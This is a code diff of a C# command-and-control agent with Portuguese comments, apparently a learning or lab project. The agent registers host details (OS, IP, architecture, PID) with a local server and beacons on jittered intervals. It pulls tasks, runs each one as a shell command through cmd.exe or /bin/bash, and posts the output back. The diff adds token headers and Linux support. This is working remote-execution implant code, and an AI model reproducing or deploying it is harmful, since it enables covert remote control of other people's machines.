@@ -3,28 +3,27 @@ using System.Diagnostics;
 using System.Net.Http;
 using System.Text;
 using System.Text.Json;
-using System.Threading;
-using System.Threading.Tasks;
 using System.Net.NetworkInformation;
 
 class Agent
 {
-    // ── Configuração ──────────────────────────────────────────────
+    // Configuração
     static readonly string SERVER_URL     = "http://localhost:3000";
-    static readonly int    BEACON_MIN_MS  = 5000;   // intervalo mínimo
-    static readonly int    BEACON_MAX_MS  = 12000;  // intervalo máximo (jitter)
+    static readonly int    BEACON_MIN_MS  = 5000;   // intervalo mínimo (5s)
+    static readonly int    BEACON_MAX_MS  = 12000;  // intervalo máximo (12s)
 
     static readonly HttpClient http = new HttpClient();
     static string agentId = "";
+    static string agentToken = "";
 
-    // ── Entry point ───────────────────────────────────────────────
+    // Entry point
     static async Task Main(string[] args)
     {
         Console.WriteLine("[*] Agente iniciado...");
 
-        // 1. Registra no servidor e salva o ID retornado
-        agentId = await Register();
-        if (string.IsNullOrEmpty(agentId))
+        // 1. Registra no servidor e salva o ID e token retornados
+        await Register();
+        if (string.IsNullOrEmpty(agentId) || string.IsNullOrEmpty(agentToken))
         {
             Console.WriteLine("[-] Falha ao registrar. Encerrando.");
             return;
@@ -71,8 +70,8 @@ class Agent
         }
     }
 
-    // ── Coleta informações da máquina e registra no servidor ──────
-    static async Task<string> Register()
+    // Coleta informações da máquina e registra no servidor
+    static async Task Register()
     {
         var payload = new
         {
@@ -81,7 +80,8 @@ class Agent
             os       = Environment.OSVersion.ToString(),
             ip       = GetLocalIP(),
             arch     = Environment.Is64BitOperatingSystem ? "x64" : "x86",
-            pid      = Environment.ProcessId
+            pid      = Environment.ProcessId,
+            token    = string.IsNullOrEmpty(agentToken) ? null : agentToken
         };
 
         string json     = JsonSerializer.Serialize(payload);
@@ -89,43 +89,51 @@ class Agent
         var    response = await http.PostAsync($"{SERVER_URL}/api/agents/register", content);
         string body     = await response.Content.ReadAsStringAsync();
 
-        var doc = JsonDocument.Parse(body);
+        var doc   = JsonDocument.Parse(body);
+        var agent = doc.RootElement.GetProperty("agent");
 
-        // Retorna o _id do agente criado ou atualizado
-        return doc.RootElement
-                  .GetProperty("agent")
-                  .GetProperty("_id")
-                  .GetString() ?? "";
+        agentId    = agent.GetProperty("_id").GetString() ?? "";
+        agentToken = agent.GetProperty("token").GetString() ?? "";
     }
 
-    // ── Busca tarefas pendentes para este agente ──────────────────
+    // Busca tarefas pendentes para este agente
     static async Task<JsonElement[]> GetTasks()
     {
-        var response = await http.GetAsync($"{SERVER_URL}/api/tasks/agent/{agentId}");
+        var request = new HttpRequestMessage(HttpMethod.Get, $"{SERVER_URL}/api/tasks/agent/{agentId}");
+        request.Headers.Add("x-api-token", agentToken);
+
+        var response = await http.SendAsync(request);
         string body  = await response.Content.ReadAsStringAsync();
 
         var doc = JsonDocument.Parse(body);
         return doc.RootElement.EnumerateArray().ToArray() ?? Array.Empty<JsonElement>();
     }
 
-    // ── Envia o output de um comando de volta ao servidor ─────────
+    // Envia o output de um comando de volta ao servidor
     static async Task SendResult(string taskId, string output)
     {
         var payload = new { output };
         string json    = JsonSerializer.Serialize(payload);
         var    content = new StringContent(json, Encoding.UTF8, "application/json");
-        await http.PutAsync($"{SERVER_URL}/api/tasks/{taskId}/result", content);
+
+        var request = new HttpRequestMessage(HttpMethod.Put, $"{SERVER_URL}/api/tasks/{taskId}/result");
+        request.Headers.Add("x-api-token", agentToken);
+        request.Content = content;
+
+        await http.SendAsync(request);
     }
 
-    // ── Executa um comando no sistema e retorna o output ──────────
+    // Executa um comando no sistema e retorna o output
     static string ExecuteCommand(string command)
     {
         try
         {
-            // Comandos built-in do Windows (dir, cd, echo, etc.) precisam do cmd.exe
+            bool isWindows = System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
+                System.Runtime.InteropServices.OSPlatform.Windows);
+
             var proc = new Process();
-            proc.StartInfo.FileName               = "cmd.exe";
-            proc.StartInfo.Arguments              = $"/c {command}";
+            proc.StartInfo.FileName  = isWindows ? "cmd.exe"      : "/bin/bash";
+            proc.StartInfo.Arguments = isWindows ? $"/c {command}" : $"-c \"{command}\"";
             proc.StartInfo.RedirectStandardOutput = true;
             proc.StartInfo.RedirectStandardError  = true;
             proc.StartInfo.UseShellExecute        = false;
@@ -146,7 +154,7 @@ class Agent
         }
     }
 
-    // ── Pega o IP local da máquina ────────────────────────────────
+    // Pega o IP local da máquina
     static string GetLocalIP()
     {
         foreach (var iface in NetworkInterface.GetAllNetworkInterfaces())
